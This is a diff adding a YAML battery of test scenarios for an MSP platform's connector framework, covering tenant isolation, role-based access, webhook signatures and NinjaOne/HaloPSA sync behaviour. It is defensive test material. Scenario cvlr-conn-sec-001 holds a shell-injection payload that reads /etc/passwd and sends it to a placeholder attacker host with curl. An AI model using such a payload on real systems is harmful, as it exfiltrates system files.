@@ -1,0 +1,343 @@
+# @cavaridge/agent-test — Cavalier Partners: Connector Framework Scenarios
+# Tests connector configuration security, tenant isolation of sync data,
+# RBAC enforcement on connector operations, and functional correctness.
+
+battery: cavalier-connectors
+agentId: cavalier-connectors
+
+scenarios:
+  # ── Tenant Isolation Tests ───────────────────────────────────────
+
+  - id: cvlr-conn-tenant-001
+    name: Cross-tenant connector config access blocked
+    description: MSP Admin from one MSP cannot read connector credentials belonging to another MSP
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "get_connector_config"
+      connectorId: "ninjaone"
+      targetTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "client_secret"
+        description: Must not return connector credentials from another tenant
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not leak target tenant identifier
+    expectedOutcome: pass
+    tags: [tenant_isolation, connector, critical]
+
+  - id: cvlr-conn-tenant-002
+    name: Cross-tenant sync logs isolated
+    description: Connector sync logs from one MSP must not be visible to another MSP
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "list_sync_logs"
+      connectorId: "ninjaone"
+      filterTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not return sync logs from another tenant
+    expectedOutcome: pass
+    tags: [tenant_isolation, sync_logs, critical]
+
+  - id: cvlr-conn-tenant-003
+    name: Cross-tenant manual sync trigger blocked
+    description: Attacker cannot trigger a sync on another tenant's connector instance
+    category: tenant_isolation
+    persona:
+      role: msp_admin
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_evil_msp_admin
+    input:
+      action: "trigger_sync"
+      connectorId: "halopsa"
+      targetTenantId: tenant_dit_msp
+      syncType: "full"
+    assertions:
+      - type: not_contains
+        field: result
+        value: "sync_started"
+        description: Must not allow triggering sync on foreign tenant connector
+    expectedOutcome: pass
+    tags: [tenant_isolation, sync, critical]
+
+  # ── RBAC Tests ───────────────────────────────────────────────────
+
+  - id: cvlr-conn-rbac-001
+    name: Client Admin cannot configure connectors
+    description: Connector configuration is MSP-level only — Client Admin must be denied
+    category: rbac
+    persona:
+      role: client_admin
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_admin
+    input:
+      action: "update_connector_config"
+      connectorId: "ninjaone"
+      config:
+        clientId: "stolen_client_id"
+        clientSecret: "stolen_secret"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Should return permission denied for client-tier users
+    expectedOutcome: pass
+    tags: [rbac, connector_config]
+
+  - id: cvlr-conn-rbac-002
+    name: MSP Tech cannot delete connector configurations
+    description: MSP Tech has operational access but cannot remove connectors
+    category: rbac
+    persona:
+      role: msp_tech
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_tech
+    input:
+      action: "delete_connector_config"
+      connectorId: "ninjaone"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Delete connector must be denied for MSP Tech
+    expectedOutcome: pass
+    tags: [rbac, connector_delete]
+
+  - id: cvlr-conn-rbac-003
+    name: Prospect cannot access connector dashboard
+    description: Prospect tier has no connector access whatsoever
+    category: rbac
+    persona:
+      role: prospect
+      tenantId: tenant_prospect_scan
+      tenantType: prospect
+      userId: test_user_prospect
+    input:
+      action: "list_connectors"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "access"
+        description: Should deny all connector access for prospects
+    expectedOutcome: pass
+    tags: [rbac, prospect, critical]
+
+  - id: cvlr-conn-rbac-004
+    name: Client Viewer cannot view sync logs
+    description: Sync logs contain operational data — read-only client viewers must be denied
+    category: rbac
+    persona:
+      role: client_viewer
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_viewer
+    input:
+      action: "list_sync_logs"
+      connectorId: "ninjaone"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Sync logs denied for Client Viewer
+    expectedOutcome: pass
+    tags: [rbac, sync_logs]
+
+  # ── Security Scenarios ─────────────────────────────────────────
+
+  - id: cvlr-conn-sec-001
+    name: Credential injection via connector config
+    description: Attacker attempts to inject shell commands via connector API key field
+    category: security
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "update_connector_config"
+      connectorId: "ninjaone"
+      config:
+        clientId: "valid_id"
+        clientSecret: "$(curl https://evil.com/exfil?key=$(cat /etc/passwd))"
+    assertions:
+      - type: not_contains
+        field: result
+        value: "passwd"
+        description: Shell injection must not be executed
+      - type: not_contains
+        field: result
+        value: "curl"
+        description: Command injection payload must not be reflected
+    expectedOutcome: pass
+    tags: [security, injection, critical]
+
+  - id: cvlr-conn-sec-002
+    name: Webhook signature bypass attempt
+    description: Attacker sends a webhook payload with an invalid HMAC signature
+    category: security
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "process_webhook"
+      connectorId: "ninjaone"
+      payload:
+        event: "DEVICE_ALERT"
+        deviceId: "dev_123"
+      signature: "invalid_hmac_signature_aabbccdd"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "signature"
+        description: Invalid webhook signature must be rejected
+      - type: not_contains
+        field: result
+        value: "processed"
+        description: Webhook must not be processed with invalid signature
+    expectedOutcome: pass
+    tags: [security, webhook, critical]
+
+  - id: cvlr-conn-sec-003
+    name: API credential exposure prevention
+    description: Connector config API responses must not return raw client_secret values
+    category: security
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "get_connector_config"
+      connectorId: "ninjaone"
+    assertions:
+      - type: not_contains
+        field: result.config.clientSecret
+        value: "sk_live_"
+        description: Raw API secrets must never be returned in API responses
+    expectedOutcome: pass
+    tags: [security, credential_exposure]
+
+  # ── Functional Scenarios ───────────────────────────────────────
+
+  - id: cvlr-conn-func-001
+    name: NinjaOne device sync produces normalized output
+    description: NinjaOne sync must produce NormalizedDevice objects with required fields
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "sync_devices"
+      connectorId: "ninjaone"
+      syncType: "full"
+    assertions:
+      - type: contains
+        field: result.devices[0]
+        value: "hostname"
+        description: Normalized device must include hostname
+      - type: contains
+        field: result.devices[0]
+        value: "platform"
+        description: Normalized device must include platform
+      - type: regex_match
+        field: result.syncLogId
+        value: "^[0-9a-f-]{36}$"
+        description: Sync must produce a logged sync run ID
+    expectedOutcome: pass
+    tags: [functional, ninjaone, sync]
+
+  - id: cvlr-conn-func-002
+    name: HaloPSA ticket sync maps status correctly
+    description: HaloPSA status IDs must map to normalized TicketStatus values
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "sync_tickets"
+      connectorId: "halopsa"
+      syncType: "incremental"
+    assertions:
+      - type: contains
+        field: result.tickets[0].status
+        value: "open"
+        description: HaloPSA status 1 must map to normalized 'open'
+    expectedOutcome: pass
+    tags: [functional, halopsa, sync]
+
+  - id: cvlr-conn-func-003
+    name: Connector health check reflects recent errors
+    description: Health endpoint must aggregate recent sync failures into health status
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "health_check"
+      connectorId: "ninjaone"
+    assertions:
+      - type: contains
+        field: result
+        value: "status"
+        description: Health check must return a status field
+      - type: contains
+        field: result
+        value: "lastSyncAt"
+        description: Health check must include last sync timestamp
+    expectedOutcome: pass
+    tags: [functional, health]
+
+  - id: cvlr-conn-func-004
+    name: Alert-to-ticket conversion preserves source
+    description: NinjaOne alerts converted to tickets must retain connector source metadata
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "create_ticket_from_alert"
+      connectorId: "ninjaone"
+      alert:
+        id: "alert_789"
+        severity: "critical"
+        message: "Disk space critically low on SRV-DC01"
+        deviceId: "dev_456"
+    assertions:
+      - type: regex_match
+        field: result.ticket.ticketNumber
+        value: "^TKT-\\d{5}$"
+        description: Generated ticket must follow TKT-NNNNN format
+      - type: contains
+        field: result.ticket.source
+        value: "ninjaone"
+        description: Ticket must record connector source
+    expectedOutcome: pass
+    tags: [functional, alert_to_ticket, ninjaone]
